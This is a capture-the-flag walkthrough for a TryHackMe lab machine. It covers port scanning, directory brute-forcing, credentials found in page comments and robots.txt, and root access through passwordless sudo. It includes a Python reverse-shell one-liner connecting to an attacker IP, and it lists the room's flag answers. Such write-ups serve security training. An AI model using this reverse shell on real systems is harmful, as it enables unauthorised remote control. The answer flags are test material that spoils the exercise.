# Pickle Rick
`url = https://tryhackme.com/room/picklerick`
`date = 05/22/2023`
`export IP='10.10.160.253'`

## Enumeration

1. **Network Enumeration**
```bash
Open 10.10.160.253:22
Open 10.10.160.253:80
```
* We can see that ports `22` & `80` are open which means that there is a website that can be enumerated. Other than that SSH is open as well.

2. **Directory Bruteforcing**
* On the website's landing page we can see a comment - `R1ckRul3s` as the username. We can save this for later.

* The following directories are available from dirsearch -
```bash
/assets
/index.html
/login.php
/robots.txt
```
* From the robots.txt we can also find another string that might be some kind of password that can be saved for later - `Wubbalubbadubdub`.
---

## Exploitation

1. From the given username - `R1ckRul3s` & password - `Wubbalubbadubdub`, we can now get login to the portal - `/login.php`.

2. Here there is a text field that can execute commands. From revshells page, we can get a python one liner that will setup a reverse shell to our system:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.6.36.128",1235));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
---

## Post Exploitation
1. Once we have the reverse shell, cat out the first flag `Sup3rS3cretPickl3Ingred.txt` - "mr. meeseek hair".

2. The second flag can be found in `/home/rick/second ingredients` - "1 jerry tear".

3. The third flag can be found in the `/root` directory. Checking the output of the `sudo -l` command, we find that the user `www-data` can run all commands on this machine. Hence, directly running the command `sudo -su` without a password gives us access to the root user.

4. The final flag is "fleeb juice".

fin.
